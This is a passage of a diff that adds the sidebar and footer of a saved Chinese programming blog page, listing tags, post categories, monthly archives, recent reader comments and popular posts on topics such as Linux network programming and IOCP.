+		<li><a id="ctl01_rptMainLinks_lnkLinkItem_2" title="我发表过评论的随笔" href="http://www.cnblogs.com/duzouzhe/OtherPosts.html">我的参与</a></li>
+	
+		<li><a id="ctl01_rptMainLinks_lnkLinkItem_3" href="http://www.cnblogs.com/duzouzhe/RecentComments.html">最新评论</a></li>
+	
+		<li><a id="ctl01_rptMainLinks_lnkLinkItem_4" href="http://www.cnblogs.com/duzouzhe/tag/">我的标签</a></li>
+	
+<li><a id="itemListLink" onclick="this.blur();WarpClass('itemListLink', 'itemListLin_con');return false;" href="#">更多链接</a></li>
+</ul>
+<div id="itemListLin_con" style="display:none;">
+<ul>
+
+</ul>
+</div>
+</div>
+<div class="catListTag">
+<h3 class="catListTitle">我的标签</h3>
+<ul>
+<li><a href="http://www.cnblogs.com/duzouzhe/tag/%E7%8B%AC%E5%A5%8F%E8%80%85/">独奏者</a>(3)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E5%A0%86%E5%88%86%E9%85%8DDebug%E5%92%8CRelease%E7%9A%84%E5%8C%BA%E5%88%AB/">堆分配Debug和Release的区别</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E8%8E%B7%E5%BE%97%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF/">获得网络信息</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E7%BD%91%E5%85%B3%E5%9C%B0%E5%9D%80/">网关地址</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/">疑难杂症</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E4%B8%BB%E6%9C%BAIP/">主机IP</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/">子网掩码</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/MAC/">MAC</a>(1)</li><li><a href="http://www.cnblogs.com/duzouzhe/tag/Xss/">Xss</a>(1)</li>
+</ul>
+</div>
+<div class="catListPostCategory">
+<h3 class="catListTitle">随笔分类</h3>
+
+<ul>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_0" href="http://www.cnblogs.com/duzouzhe/category/199515.html">.net(5)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_1" href="http://www.cnblogs.com/duzouzhe/category/233244.html">c/c++(17)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_2" href="http://www.cnblogs.com/duzouzhe/category/196177.html">com(15)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_3" href="http://www.cnblogs.com/duzouzhe/category/222145.html">IT英文(2)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_4" href="http://www.cnblogs.com/duzouzhe/category/242306.html">Lua</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_5" href="http://www.cnblogs.com/duzouzhe/category/236877.html">Win32(18)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_6" href="http://www.cnblogs.com/duzouzhe/category/163578.html">安全(3)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_7" href="http://www.cnblogs.com/duzouzhe/category/205476.html">生活(43)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_8" href="http://www.cnblogs.com/duzouzhe/category/226924.html">视频(6)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_9" href="http://www.cnblogs.com/duzouzhe/category/208021.html">数据结构(3)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_10" href="http://www.cnblogs.com/duzouzhe/category/197824.html">数据库(4)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_11" href="http://www.cnblogs.com/duzouzhe/category/166861.html">网络编程(32)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_12" href="http://www.cnblogs.com/duzouzhe/category/193929.html">疑难杂症(5)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_0_Link_13" href="http://www.cnblogs.com/duzouzhe/category/202454.html">杂七杂八(27)</a> </li>
+
+</ul>
+
+</div>
+
+<div class="catListPostArchive">
+<h3 class="catListTitle">随笔档案</h3>
+
+<ul>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_0" href="http://www.cnblogs.com/duzouzhe/archive/2010/05.html">2010年5月 (3)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_1" href="http://www.cnblogs.com/duzouzhe/archive/2010/04.html">2010年4月 (18)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_2" href="http://www.cnblogs.com/duzouzhe/archive/2010/03.html">2010年3月 (27)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_3" href="http://www.cnblogs.com/duzouzhe/archive/2010/02.html">2010年2月 (3)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_4" href="http://www.cnblogs.com/duzouzhe/archive/2010/01.html">2010年1月 (17)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_5" href="http://www.cnblogs.com/duzouzhe/archive/2009/12.html">2009年12月 (19)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_6" href="http://www.cnblogs.com/duzouzhe/archive/2009/11.html">2009年11月 (21)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_7" href="http://www.cnblogs.com/duzouzhe/archive/2009/10.html">2009年10月 (13)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_8" href="http://www.cnblogs.com/duzouzhe/archive/2009/09.html">2009年9月 (13)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_9" href="http://www.cnblogs.com/duzouzhe/archive/2009/08.html">2009年8月 (14)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_10" href="http://www.cnblogs.com/duzouzhe/archive/2009/07.html">2009年7月 (13)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_11" href="http://www.cnblogs.com/duzouzhe/archive/2009/06.html">2009年6月 (20)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_12" href="http://www.cnblogs.com/duzouzhe/archive/2008/12.html">2008年12月 (1)</a> </li>
+
+<li><a id="ctl03_CatList_LinkList_1_Link_13" href="http://www.cnblogs.com/duzouzhe/archive/2008/11.html">2008年11月 (1)</a> </li>
+
+</ul>
+
+</div>
+
+<div class="catList">
+<h3 class="catListTitle">友情连接</h3>
+
+<ul>
+
+<li><a id="ctl03_CatList_LinkList_2_Link_0" rel="nofollow" href="http://hi.baidu.com/pro%5Fhc">昌弟的博客</a> </li>
+
+</ul>
+
+</div>
+
+
+<div class="catListComment">
+<h3 class="catListTitle">最新评论<a id="_2cb3c98_RSSHyperlink1" title="RSS订阅最最新评论" href="http://www.cnblogs.com/duzouzhe/CommentsRSS.aspx"><img title="RSS订阅最最新评论" src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/xml.gif" alt=""></a></h3>
+
+	<div id="RecentCommentsBlock"><ul>
+    <li class="recent_comment_title"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/27/1512474.html#2491321">1. Re:类成员指针 error C2064: term does not evaluate to a function</a></li>
+    <li class="recent_comment_body">为什么我调用函数时程序会崩溃呢</li>
+    <li class="recent_comment_author">--xiongli</li>
+    <li class="recent_comment_title"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/07/31/1535866.html#2488238">2. Re:线程ID 与 线程句柄 区别 (转载)</a></li>
+    <li class="recent_comment_body">学习了。</li>
+    <li class="recent_comment_author">--肥牛的老大</li>
+    <li class="recent_comment_title"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506699.html#2471058">3. Re:Linux网络编程入门 (转载)</a></li>
+    <li class="recent_comment_body">很好的文章</li>
+    <li class="recent_comment_author">--boyfood</li>
+    <li class="recent_comment_title"><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/13/1646514.html#2384774">4. Re:IOCP~~</a></li>
+    <li class="recent_comment_body">非常不错！</li>
+    <li class="recent_comment_author">--青茶柠檬</li>
+    <li class="recent_comment_title"><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/13/1646514.html#2335106">5. Re:IOCP~~</a></li>
+    <li class="recent_comment_body">不过这个文档很不错。</li>
+    <li class="recent_comment_author">--zhxingway</li>
+</ul>
+</div>
+</div>
+
+<div class="catListView">
+<h3 class="catListTitle">阅读排行榜</h3>
+	<div id="TopViewPostsBlock"><ul><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506699.html">1. Linux网络编程入门 (转载)(15336)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/04/1495794.html">2. User breakpoint called from code at 0x********(7707)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/10/24/1589348.html">3. c文件操作 (转)(7672)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/13/1646514.html">4. IOCP~~(6428)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/27/1512474.html">5. 类成员指针 error C2064: term does not evaluate to a function(3275)</a></li></ul></div>
+</div>
+
+<div class="catListFeedback">
+<h3 class="catListTitle">评论排行榜</h3>
+	<div id="TopFeedbackPostsBlock"><ul><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/27/1512474.html">1. 类成员指针 error C2064: term does not evaluate to a function(5)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/13/1646514.html">2. IOCP~~(4)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/04/1495794.html">3. User breakpoint called from code at 0x********(3)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506699.html">4. Linux网络编程入门 (转载)(1)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2010/03/19/1690252.html">5. 创建快捷方式(1)</a></li></ul></div>
+</div>
+
+<h3 class="catListTitle">推荐排行榜</h3>
+<div class="RecentComment">
+	<div id="TopDiggPostsBlock"><ul><li><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/19/1651425.html">1. 每句话都可以品味一生(2)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/07/31/1535866.html">2. 线程ID 与 线程句柄 区别 (转载)(2)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506699.html">3. Linux网络编程入门 (转载)(2)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/04/1495794.html">4. User breakpoint called from code at 0x********(1)</a></li><li><a href="http://www.cnblogs.com/duzouzhe/archive/2010/01/13/1646514.html">5. IOCP~~(1)</a></li></ul></div>
+</div></div>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		
+<!--done-->
+Copyright ©2012 独奏者
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<script type="text/javascript" src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/google-analytics.js"></script>
+
+
+</body></html>
